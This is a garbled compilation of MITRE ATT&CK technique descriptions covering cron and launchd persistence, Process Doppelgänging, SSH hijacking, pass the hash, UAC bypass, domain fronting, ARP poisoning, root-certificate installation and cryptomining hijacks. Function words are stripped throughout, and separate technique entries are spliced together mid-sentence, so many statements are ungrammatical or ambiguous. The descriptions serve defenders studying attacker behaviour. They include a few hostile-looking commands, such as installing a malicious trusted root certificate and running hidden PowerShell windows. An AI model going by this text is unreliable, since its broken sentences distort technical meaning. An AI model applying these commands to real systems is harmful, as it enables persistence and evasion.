Adversaries digital certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) create self-signed certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1587/003)). Digital certificates installed adversary controlled infrastructure acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Linux macOS systems, multiple methods supported creating pre-scheduled periodic background jobs: cron, (Citation: Die.net Linux crontab Page) at, (Citation: Die.net Linux Page) launchd. (Citation: AppleDocs Scheduling Timed Jobs) [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) Windows systems, job scheduling Linux-based systems remotely conjunction established remote session, secure (SSH).

### cron

System-wide cron jobs installed modifying <code>/etc/crontab</code> file, <code>/etc/cron.d/</code> directory locations supported Cron daemon, per-user cron jobs installed crontab formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) macOS Linux systems.

Those methods commands scripts executed specific, periodic intervals background user interaction. adversary job scheduling execute programs startup scheduled basis Persistence, (Citation: Janicab) (Citation: Methods Mac Malware Persistence) (Citation: Malware Persistence OS X) (Citation: Avast Linux Trojan Cron Persistence) conduct Execution Lateral Movement, gain root privileges, process context specific account.

### at

The program POSIX-based systems, including macOS Linux, schedule program script job execution time, purposes.

### launchd

Each launchd job configuration property list (plist) file [Launch Daemon](https://attack.mitre.org/techniques/T1160) [Launch Agent](https://attack.mitre.org/techniques/T1159), additional key called <code>StartCalendarInterval</code> dictionary time values. (Citation: AppleDocs Scheduling Timed Jobs) macOS OS X. setuid setgid bits set Linux macOS application, application privileges owning user  (Citation: setuid page). application current user’s context, user owns application. instances programs executed elevated context function properly, user running doesn’t elevated privileges. creating entry sudoers file, root, user setuid setgid flag set applications. bits "s" "x" viewing file's attributes <code>ls -l</code>. <code>chmod</code> program set bits bitmasking, <code>chmod 4777 [file]</code> shorthand naming, <code>chmod u+s [file]</code>.

An adversary advantage escape exploit vulnerability application setsuid setgid bits code running user’s context. Additionally, adversaries mechanism malware execute elevated contexts future  (Citation: OSX Keydnap malware). Adversaries startup items automatically executed boot initialization establish persistence. Startup items execute final phase boot process scripts executable files configuration determine execution startup items.(Citation: Startup Items)

This technically deprecated technology (superseded [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), folder, <code>/Library/StartupItems</code> isn’t guaranteed exist default, exist default macOS Sierra. startup item directory executable configuration property list (plist), <code>StartupParameters.plist</code>, reside top-level directory. 

An adversary create folders/files StartupItems directory register persistence mechanism.(Citation: Methods Mac Malware Persistence) Additionally, StartupItems bootup phase macOS, elevated root user. script openly accessible server adversary server gateway network. provide set functions execute command-line interface hosts server. addition server-side script, client interface program talk server (see, example, China Chopper client). (Citation: Lee 2013)

Web shells serve [Redundant Access](https://attack.mitre.org/techniques/T1108) persistence mechanism adversary's primary access methods detected removed. Windows Transactional NTFS (TxF) introduced Vista method perform safe file operations. (Citation: TxF) ensure data integrity, TxF enables transacted handle write file time. write handle transaction terminated, handles isolated writer read committed version file existed time handle opened. (Citation: Basic TxF Concepts) avoid corruption, TxF performs automatic rollback application fails write transaction. (Citation: TxF)

Although deprecated, TxF application programming interface (API) enabled Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)

Adversaries leverage TxF perform file-less variation [Process Injection](https://attack.mitre.org/techniques/T1055) called Process Doppelgänging. [Process Hollowing](https://attack.mitre.org/techniques/T1093), Process Doppelgänging involves replacing memory legitimate process, enabling veiled execution malicious code evade defenses detection. Process Doppelgänging's TxF avoids highly-monitored API functions NtUnmapViewOfSection, VirtualProtectEx, SetThreadContext. (Citation: BlackHat Process Doppelgänging Dec 2017)

Process Doppelgänging implemented 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):

* Transact – Create TxF transaction legitimate executable overwrite file malicious code. isolated visible context transaction.
* Load – Create shared memory load malicious executable.
* Rollback – Undo original executable, effectively removing malicious code file system.
* Animate – Create process tainted memory initiate execution. Secure (SSH) standard remote access Linux macOS systems. user connect encrypted tunnel, commonly authenticating password, certificate asymmetric encryption key pair.

In laterally compromised host, adversaries advantage trust relationships established systems public key authentication active SSH sessions hijacking existing connection system. occur compromising SSH agent access agent's socket. adversary root access, hijacking SSH sessions trivial. (Citation: Slideshare Abusing SSH) (Citation: SSHjack Blackhat) (Citation: Clockwork SSH Agent Hijacking) Compromising SSH agent access intercept SSH credentials. (Citation: Welivesecurity Ebury SSH)

[SSH Hijacking](https://attack.mitre.org/techniques/T1184) differs [Remote Services](https://attack.mitre.org/techniques/T1021) injects existing SSH session creating session [Valid Accounts](https://attack.mitre.org/techniques/T1078). Adversaries attempt gather language victim infer geographical location host. shape follow-on behaviors, including adversary infects target attempts specific actions. decision employed malware developers operators reduce risk attracting attention specific law enforcement agencies prosecution/scrutiny entities.(Citation: Malware Language Check)

There sources data adversary infer language, defaults keyboard layouts. Specific checks vary based target adversary, involve behaviors [Query Registry](https://attack.mitre.org/techniques/T1012) calls [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: CrowdStrike Ryuk January 2019) 

For example, Windows adversaries attempt infer language querying registry key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language</code> parsing outputs Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> <code>GetUserDefaultLangID</code>.(Citation: Darkside Ransomware Cybereason)(Citation: Securelist JSWorm)(Citation: SecureList SynAck Doppelgänging 2018)

On macOS Linux system, adversaries query <code>locale</code> retrieve <code>$LANG</code> environment variable. Adversaries non-application layer protocol communication host C2 server infected hosts network. list protocols extensive.(Citation: Wikipedia OSI) Specific examples include network layer protocols, Internet Control Message Protocol (ICMP), transport layer protocols, User Datagram Protocol (UDP), session layer protocols, Socket Secure (SOCKS), redirected/tunneled protocols, Serial LAN (SOL).

ICMP communication hosts example.(Citation: Cisco Synful Knock Evolution) ICMP Internet Protocol Suite, required implemented IP-compatible hosts.(Citation: ICMP) However, commonly monitored Internet Protocols TCP UDP adversaries hide communications. Pass hash (PtH) method authenticating user access user's cleartext password. method bypasses standard authentication steps require cleartext password, moving portion authentication password hash. technique, valid password hashes account captured Credential Access technique. Captured hashes PtH authenticate user. authenticated, PtH perform actions local remote systems. 

Windows 7 KB2871997 require valid domain user credentials RID 500 administrator hashes. (Citation: NSA Spotting) Adversaries steganography techniques prevent detection hidden information. Steganographic techniques hide data digital media images, audio tracks, video clips, files.

[Duqu](https://attack.mitre.org/software/S0038) malware steganography. encrypted gathered victim's image exfiltrating image C2 server.(Citation: Wikipedia Duqu) 

By 2017, threat used <code>Invoke-PSImage</code> to hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands image file (.png) execute code victim's system. [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded obfuscated script gather intelligence victim's machine communicate adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)   Adversaries compromise third-party DNS servers targeting. post-compromise activity, adversaries utilize DNS traffic tasks, including Command Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). setting DNS servers, adversaries compromise third-party DNS servers support operations.

By compromising DNS servers, adversaries alter DNS records. control redirection organization's traffic, facilitating Collection Credential Access efforts adversary.(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye DNS Hijack 2019)  Additionally, adversaries leverage control conjunction [Digital Certificates](https://attack.mitre.org/techniques/T1588/004) redirect traffic adversary-controlled infrastructure, mimicking normal trusted network communications.(Citation: FireEye DNS Hijack 2019)(Citation: Crowdstrike DNS Hijack 2019) Adversaries silently create subdomains malicious servers tipping actual owner DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain Shadowing) Adversaries impersonate legitimate protocols service traffic disguise command control activity thwart analysis efforts. impersonating legitimate protocols services, adversaries command control traffic blend legitimate network traffic.  

Adversaries impersonate fake SSL/TLS handshake subsequent traffic SSL/TLS encrypted, interfering security tooling, traffic trusted entity.  Adversaries interact Windows Registry gather system, configuration, installed software.

The Registry operating system, configuration, software, security.(Citation: Wikipedia Windows Registry) easily queried [Reg](https://attack.mitre.org/software/S0075) utility, access Registry exist. adversaries operation network. Adversaries [Query Registry](https://attack.mitre.org/techniques/T1012) automated discovery shape follow-on behaviors, including adversary infects target attempts specific actions. adversary exfiltrate data fixed size chunks files limit packet sizes thresholds. approach avoid triggering network data transfer threshold alerts. Windows Remote Management (WinRM) Windows service protocol user interact remote executable, modify Registry, modify services). (Citation: WinRM) called <code>winrm</code> command programs PowerShell. (Citation: Jacobsen 2014) Adversaries stolen session cookies authenticate applications services. technique bypasses multi-factor authentication protocols session authenticated.(Citation: Pass Cookie)

Authentication cookies commonly applications, including cloud-based services, user authenticated service credentials passed re-authentication occur frequently. Cookies valid extended period time, application actively used. cookie [Steal Session Cookie](https://attack.mitre.org/techniques/T1539) [Web Cookies](https://attack.mitre.org/techniques/T1606/001), adversary import cookie browser control application user session cookie active. logged site, adversary access sensitive information, read email, perform actions victim account permissions perform.

There examples malware targeting session cookies bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries abuse credentials domain account gaining Initial Access, Persistence, Privilege Escalation, Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts managed Active Directory Domain Services access permissions configured systems services domain. Domain accounts cover users, administrators, services.(Citation: Accounts)

Adversaries compromise domain accounts, level privileges, [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) password reuse, allowing access privileged resources domain. Adversaries abuse Regsvcs Regasm proxy execution code trusted Windows utility. Regsvcs Regasm Windows command-line utilities register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. binaries digitally signed Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

Both utilities bypass application control attributes binary code registration unregistration: <code>[ComRegisterFunction]</code> <code>[ComUnregisterFunction]</code> respectively. code registration unregistration attributes executed process insufficient privileges fails execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm) **This technique deprecated. [Path Interception PATH Environment Variable](https://attack.mitre.org/techniques/T1574/007), [Path Interception Search Hijacking](https://attack.mitre.org/techniques/T1574/008), [Path Interception Unquoted Path](https://attack.mitre.org/techniques/T1574/009).**

Path interception occurs executable specific path executed application intended target. [cmd](https://attack.mitre.org/software/S0106) current directory vulnerable application loads CMD BAT file CreateProcess function. (Citation: TechNet MS14-019)

There multiple distinct weaknesses misconfigurations adversaries advantage performing path interception: unquoted paths, path environment variable misconfigurations, search hijacking. vulnerability deals program paths, occur program paths specified. techniques persistence executables called regular basis, privilege escalation intercepted executables started privileged process.

### Unquoted Paths
Service paths (stored Windows Registry keys) (Citation: Subkey) shortcut paths vulnerable path interception path spaces surrounded quotation marks <code>C:\unsafe path space\program.exe</code> vs. <code>"C:\safe path space\program.exe"</code>). (Citation: Baggett 2012) adversary executable level directory path, Windows resolve executable intended executable. example, path shortcut <code>C:\program files\myapp.exe</code>, adversary create program <code>C:\program.exe</code> intended program. (Citation: SecurityBoulevard Unquoted Services APR 2018) (Citation: SploitSpren Windows Priv Jan 2018)

### PATH Environment Variable Misconfiguration
The PATH environment variable list directories. methods executing program (namely cmd.exe command-line) rely solely PATH environment variable determine locations searched program path program given. directories listed PATH environment variable Windows directory, <code>%SystemRoot%\system32</code> <code>C:\Windows\system32</code>), program preceding directory named Windows program (such cmd, PowerShell, Python), executed command executed script command-line.

For example, <code>C:\example path</code> precedes <code>C:\Windows\system32</code> PATH environment variable, program named net.exe <code>C:\example path</code> called Windows "net" "net" executed command-line.

### Search Hijacking
Search hijacking occurs adversary abuses Windows searches programs path. search differs depending method execute program. (Citation: CreateProcess) (Citation: Hill NT Shell) (Citation: WinExec) However, common Windows search directory initiating program searching Windows directory. adversary program vulnerable search hijacking (i.e., program path executable) advantage vulnerability creating program named improperly program placing initiating program's directory.

For example, "example.exe" runs "cmd.exe" command-line argument <code>net user</code>. adversary program called "net.exe" directory example.exe, "net.exe" Windows utility net. addition, adversary program called "net.com" directory "net.exe", <code>cmd.exe /C user</code> execute "net.com" "net.exe" executable extensions defined PATHEXT. (Citation: MSDN Environment Property)

Search hijacking common practice hijacking DLL loads covered [DLL Search Hijacking](https://attack.mitre.org/techniques/T1038). Adversaries stolen session cookies authenticate applications services. technique bypasses multi-factor authentication protocols session authenticated.(Citation: Pass Cookie)

Authentication cookies commonly applications, including cloud-based services, user authenticated service credentials passed re-authentication occur frequently. Cookies valid extended period time, application actively used. cookie [Steal Session Cookie](https://attack.mitre.org/techniques/T1539), adversary imports cookie browser control application user session cookie active. logged site, adversary access sensitive information, read email, perform actions victim account permissions perform.

There examples malware targeting session cookies bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)  Adversaries install root certificate compromised avoid warnings connecting adversary controlled servers. Root certificates public key cryptography identify root certificate authority (CA). root certificate installed, application trust certificates root's chain trust signed root certificate.(Citation: Wikipedia Root Certificate) Certificates commonly establishing secure TLS/SSL communications browser. user attempts browse certificate trusted error message displayed warn user security risk. Depending security settings, browser user establish connection website.

Installation root certificate compromised adversary degrade security system. Adversaries technique avoid security warnings prompting users compromised systems connect HTTPS adversary controlled servers spoof legitimate websites collect login credentials.(Citation: Operation Emmental)

Atypical root certificates pre-installed systems manufacturer software supply chain conjunction malware/adware provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability intercepting transmitted secure TLS/SSL communications.(Citation: Kaspersky Superfish)

Root certificates (and chains) cloned reinstalled. Cloned certificate chains carry metadata characteristics source sign malicious code bypass signature validation tools (ex: Sysinternals, antivirus, etc.) block execution uncover artifacts Persistence.(Citation: SpectorOps Code Signing Dec 2017)

In macOS, Ay MaMi malware <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> install malicious certificate trusted root certificate keychain.(Citation: objective-see ay mami 2018) Adversaries network logon scripts automatically executed logon initialization establish persistence. Network logon scripts assigned Active Directory Policy Objects.(Citation: Petri Logon Script AD) logon scripts privileges user assigned to. Depending systems network, initializing scripts apply systems.  
 
Adversaries scripts maintain persistence network. Depending access configuration logon scripts, local credentials administrator account necessary. Adversaries perform Endpoint Denial Service (DoS) attacks degrade block availability services users. Endpoint DoS performed exhausting resources services hosted exploiting persistent crash condition. services include websites, email services, DNS, web-based applications. Adversaries observed conducting DoS attacks political purposes(Citation: FireEye OpPoisonedHandover February 2016) support malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, extortion.(Citation: Symantec DDoS October 2014)

An Endpoint DoS denies availability service saturating network provide access service. Adversaries target layers application stack hosted provide service. layers include Operating Systems (OS), server applications servers, DNS servers, databases, (typically web-based) applications sit them. Attacking layer requires techniques advantage bottlenecks unique respective components. DoS attack generated single multiple systems spread internet, commonly referred distributed DoS (DDoS).

To perform DoS attacks endpoint resources, aspects apply multiple methods, including IP address spoofing botnets.

Adversaries original IP address attacking system, spoof source IP address attack traffic difficult trace attacking enable reflection. increase difficulty defenders defending attack reducing eliminating effectiveness filtering source address network defense devices.

Botnets commonly conduct DDoS attacks networks services. botnets generate traffic systems spread global internet. Adversaries resources build control botnet infrastructure rent time existing botnet conduct attack. worst DDoS, systems generate requests send traffic produce volume exhaust target's resources. circumstances, distinguishing DDoS traffic legitimate clients exceedingly difficult. Botnets high-profile DDoS attacks, 2012 series incidents targeted major banks.(Citation: USNYAG IranianBotnet March 2016)

In traffic manipulation used, global network (such traffic gateway routers) packets altered legitimate clients execute code directs network packets target volume. type capability purposes censorship client traffic modified include reference JavaScript generated DDoS code overwhelm target servers.(Citation: ArsTechnica Firewall China)

For attacks attempting saturate providing network, [Network Denial Service](https://attack.mitre.org/techniques/T1498).
 Adversaries attempt payloads difficult discover analyze delivering files victims uncompiled code. Text-based source code files subvert analysis scrutiny protections targeting executables/binaries. payloads compiled execution; typically native utilities csc.exe GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)

Source code payloads encrypted, encoded, embedded files, delivered [Phishing](https://attack.mitre.org/techniques/T1566). Payloads delivered formats unrecognizable inherently benign native OS (ex: EXEs macOS/Linux) (re)compiled proper executable binary bundled compiler execution framework.(Citation: TrendMicro WindowsAppMac) Adversaries conduct C2 communications non-standard port bypass proxies firewalls improperly configured. 
Adversaries gather attempt calculate geographical location victim host. Adversaries [System Location Discovery](https://attack.mitre.org/techniques/T1614) automated discovery shape follow-on behaviors, including adversary infects target attempts specific actions.

Adversaries attempt infer location checks, time zone, keyboard layout, language settings.(Citation: FBI Ragnar Locker 2020)(Citation: Sophos Geolocation 2016)(Citation: Bleepingcomputer RAT malware 2020) Windows API functions <code>GetLocaleInfoW</code> determine locale host.(Citation: FBI Ragnar Locker 2020) cloud environments, instance's availability zone discovered accessing instance metadata service instance.(Citation: AWS Instance Identity Documents)(Citation: Azure Instance Metadata 2021)

Adversaries attempt infer location victim host IP addressing, online geolocation IP-lookup services.(Citation: Securelist Trasparent Tribe 2020)(Citation: Sophos Geolocation 2016) Adversaries hide malicious Visual Basic Applications (VBA) payloads embedded Office documents replacing VBA source code benign data.(Citation: FireEye VBA stomp Feb 2020)

MS Office documents embedded VBA content store source code module streams. module stream <code>PerformanceCache</code> stores separate compiled version VBA source code p-code. p-code executed Office version <code>_VBA_PROJECT</code> stream (which version-dependent description VBA project) matches version host Office application.(Citation: Evil Clippy 2019)(Citation: _VBA_PROJECT Stream)

An adversary hide malicious VBA code overwriting VBA source code location zero’s, benign code, random bytes leaving compiled malicious p-code. Tools scan malicious VBA source code bypassed unwanted code hidden compiled p-code. VBA source code removed, tools macros present. version match <code>_VBA_PROJECT</code> stream host Office application, p-code executed, benign VBA source code decompressed recompiled p-code, removing malicious p-code bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev) Adversaries abuse BITS jobs persistently execute code perform background tasks. Windows Background Intelligent Transfer Service (BITS) low-bandwidth, asynchronous file transfer mechanism exposed [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: COM)(Citation: BITS) BITS commonly updaters, messengers, applications preferred operate background (using idle bandwidth) interrupting networked applications. File transfer tasks implemented BITS jobs, queue file operations.

The interface create manage BITS jobs accessible [PowerShell](https://attack.mitre.org/techniques/T1059/001) [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: BITS)(Citation: BITSAdmin)

Adversaries abuse BITS download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, clean running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks self-contained BITS job database, files registry modifications, permitted host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS 2007)(Citation: Symantec BITS 2007) BITS enabled execution enable persistence creating long-standing jobs (the default maximum lifetime 90 days extendable) invoking arbitrary program job completes errors (including reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)

BITS upload functionalities perform [Exfiltration Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016) Adversaries MSBuild proxy execution code trusted Windows utility. MSBuild.exe (Microsoft Build Engine) software build platform Visual Studio. handles XML formatted project files define requirements loading building platforms configurations.(Citation: MSDN MSBuild)

Adversaries abuse MSBuild proxy execution malicious code. inline task capability MSBuild introduced .NET version 4 C# Visual Basic code inserted XML project file.(Citation: MSDN MSBuild)(Citation: MSBuild Inline Tasks 2017) MSBuild compile execute inline task. MSBuild.exe signed binary, execute arbitrary code bypass application control defenses configured MSBuild.exe execution.(Citation: LOLBAS Msbuild) Windows User Account Control (UAC) program elevate privileges perform task administrator-level permissions prompting user confirmation. impact user ranges denying operation enforcement allowing user perform action local administrators prompt allowing enter administrator password complete action. (Citation: TechNet UAC Works)

If UAC protection level set level, Windows programs allowed elevate privileges execute elevated objects prompting user UAC notification box. (Citation: TechNet UAC) (Citation: MSDN Elevation) rundll32.exe load crafted DLL loads auto-elevated object performs file operation protected directory typically require elevated access. Malicious software injected trusted process gain elevated privileges prompting user. (Citation: Davidson Windows) Adversaries techniques elevate privileges administrator target process unprotected.

Many methods discovered bypass UAC. Github readme UACMe extensive list methods (Citation: Github UACMe) discovered implemented UACMe, comprehensive list bypasses. Additional bypass methods regularly discovered wild, as:

* <code>eventvwr.exe</code> auto-elevate execute binary script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)

Another bypass Lateral Movement techniques credentials account administrator privileges known, UAC single security mechanism, privilege integrity process running unknown lateral systems default integrity. (Citation: SANS UAC Bypass) Adversaries modify systems manipulate data accessed displayed user.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) manipulating runtime data, adversaries attempt affect business process, organizational understanding, decision making. 

Adversaries alter application binaries display data runtime manipulations. Adversaries conduct [Change Default File Association](https://attack.mitre.org/techniques/T1042) [Masquerading](https://attack.mitre.org/techniques/T1036) effect. type modification impact depends target application process goals objectives adversary. complex systems, adversary special expertise access specialized software typically gained prolonged gathering campaign desired impact. Adversaries advantage routing schemes Content Delivery Networks (CDNs) services host multiple domains obfuscate intended destination HTTPS traffic traffic tunneled HTTPS. (Citation: Fifield Blocking Resistent Communication domain fronting 2015) Domain fronting involves domain names SNI field TLS header Host field header. domains served CDN, CDN route address header unwrapping TLS header. variation technique, "domainless" fronting, utilizes SNI field left blank; fronting CDN attempts validate SNI Host fields match (if blank SNI fields ignored).

For example, domain-x domain-y customers CDN, domain-x TLS header domain-y header. Traffic domain-x, CDN route domain-y. Adversaries poison Address Resolution Protocol (ARP) caches position communication networked devices. activity enable follow-on behaviors [Network Sniffing](https://attack.mitre.org/techniques/T1040) [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).

The ARP protocol resolve IPv4 addresses link layer addresses, media access control (MAC) address.(Citation: RFC826 ARP) Devices local network segment communicate link layer addresses. networked device link layer address networked device, send broadcast ARP request local network translate IP address MAC address. device IP address replies MAC address. networked device ARP request store ARP cache.

An adversary passively wait ARP request poison ARP cache requesting device. adversary reply MAC address, deceiving victim communicating intended networked device. adversary poison ARP cache, reply faster legitimate IP address owner. Adversaries send gratuitous ARP reply maliciously announces ownership IP address devices local network segment.

The ARP protocol stateless require authentication. Therefore, devices wrongly add update MAC address IP address ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)

Adversaries ARP cache poisoning intercept network traffic. activity collect relay data credentials, insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)
 adversary disable cloud logging capabilities integrations limit data collected activities avoid detection. 

Cloud environments collection analysis audit application logs provide insight activities user environment. adversary sufficient permissions, disable logging avoid detection activities. example, AWS adversary disable CloudWatch/CloudTrail integrations prior conducting malicious activity.(Citation: CloudTrail: Generating strong AWS security signals Sumo Logic) Adversaries attempt listing security software, configurations, defensive tools, sensors installed cloud environment. include firewall rules anti-virus. Adversaries [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) automated discovery shape follow-on behaviors, including adversary infects target attempts specific actions.

Example commands security software [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> [cmd](https://attack.mitre.org/software/S0106), [Tasklist](https://attack.mitre.org/software/S0057), indicators discovery behavior specific type software security adversary for. common macOS malware perform checks LittleSnitch KnockKnock software.

Adversaries utilize cloud APIs discover configurations firewall rules environment.(Citation: Expel Evil AWS) example, permitted IP ranges, ports user accounts inbound/outbound rules security groups, virtual firewalls established AWS EC2 VPC instances, revealed <code>DescribeSecurityGroups</code> action request parameters. (Citation: DescribeSecurityGroups - Amazon Elastic Compute Cloud) Adversaries hidden windows conceal malicious activity plain sight users. cases, windows typically displayed application carries operation hidden. utilized administrators avoid disrupting user environments carrying administrative tasks. 

On Windows, variety features scripting languages Windows, [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, [Visual Basic](https://attack.mitre.org/techniques/T1059/005) windows hidden. <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell 2019)

Similarly, macOS configurations applications listed property list (plist) files. tags files <code>apple.awt.UIElement</code>, Java applications prevent application's icon appearing Dock. common applications tray, Dock.

Adversaries abuse functionalities hide visible windows users alert user adversary activity system.(Citation: Antiquated Mac Malware) Adversaries alter data en route storage systems manipulate external outcomes hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) manipulating transmitted data, adversaries attempt affect business process, organizational understanding, decision making. 

Manipulation network connection processes opportunity deploy tool intercept change information. type modification impact depends target transmission mechanism goals objectives adversary. complex systems, adversary special expertise access specialized software typically gained prolonged gathering campaign desired impact. Adversaries abuse Python commands scripts execution. Python popular scripting/programming language, capabilities perform functions. Python executed interactively command-line (via <code>python.exe</code> interpreter) scripts (.py) written distributed systems. Python code compiled binary executables.

Python built-in packages interact underlying system, file operations device I/O. Adversaries libraries download execute commands scripts perform malicious behaviors. Adversaries gather identities roles victim organization targeting. business roles reveal variety targetable details, including identifiable key personnel data/resources access to.

Adversaries gather ways, direct elicitation [Phishing Information](https://attack.mitre.org/techniques/T1598). business roles exposed adversaries online accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering reveal opportunities forms reconnaissance (ex: [Phishing Information](https://attack.mitre.org/techniques/T1598) [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)). Adversaries encode data content command control traffic difficult detect. Command control (C2) encoded standard data encoding system. data encoding adhere existing protocol specifications includes ASCII, Unicode, Base64, MIME, binary-to-text character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) data encoding systems result data compression, gzip. Adversaries establish persistence elevate privileges executing malicious content triggered AppInit DLLs loaded processes. Dynamic-link libraries (DLLs) <code>AppInit_DLLs</code> Registry <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> <code>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code> loaded user32.dll process loads user32.dll. practice program, user32.dll common library. (Citation: Elastic Process Injection July 2017)

Similar Process Injection, values abused elevated privileges causing malicious DLL loaded context separate processes computer. (Citation: AppInit Registry) Malicious AppInit DLLs provide persistence continuously triggered API activity. 

The AppInit DLL functionality disabled Windows 8 versions secure boot enabled. (Citation: AppInit Secure Boot) Adversaries send phishing messages elicit sensitive targeting. Phishing attempt trick targets divulging information, frequently credentials actionable information. Phishing [Phishing](https://attack.mitre.org/techniques/T1566) objective gathering data victim executing malicious code.

All forms phishing electronically delivered social engineering. Phishing targeted, spearphishing. spearphishing, specific individual, company, industry targeted adversary. generally, adversaries conduct non-targeted phishing, mass credential harvesting campaigns.

Adversaries exchange emails, instant messages, electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Phishing frequently involves social engineering techniques, posing source reason collect (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) sending multiple, seemingly urgent messages. Adversaries leverage resources co-opted systems solve resource intensive problems, impact hosted service availability. 

One common purpose Resource Hijacking validate transactions cryptocurrency networks earn virtual currency. Adversaries consume resources negatively impact machines unresponsive.(Citation: Kaspersky Lazarus Hood Blog 2017) Servers cloud-based systems common targets potential resources, user endpoint systems compromised Resource Hijacking cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized environments targeted ease deployment exposed APIs potential scaling mining activities deploying compromising multiple containers environment cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs)

Additionally, cryptocurrency mining malware identify kill processes competing malware ensure it’s competing resources.(Citation: Trend Micro War Crypto Miners)

Adversaries malware leverages system's network bandwidth botnet facilitate [Network Denial Service](https://attack.mitre.org/techniques/T1498) campaigns seed malicious torrents.(Citation: GoBotKR) Adversaries create cultivate accounts services targeting. Adversaries create accounts build persona operations. Persona development consists development public information, presence, history affiliations. development applied social media, website, publicly referenced scrutinized legitimacy operation persona identity.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)

For operations incorporating social engineering, utilization online persona important. personas fictitious impersonate real people. persona exist single multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing persona require development additional documentation real. include filling profile information, developing social networks, incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)

Establishing accounts include creation accounts email providers, leveraged [Phishing Information](https://attack.mitre.org/techniques/T1598) [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) Adversaries steal capabilities targeting. developing capabilities in-house, adversaries purchase, freely download, steal them. Activities include acquisition malware, software (including licenses), exploits, certificates, relating vulnerabilities. Adversaries capabilities support operations numerous phases adversary lifecycle.

In addition downloading malware, software, exploits internet, adversaries purchase capabilities third-party entities. Third-party entities include technology companies specialize malware exploits, criminal marketplaces, individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab)

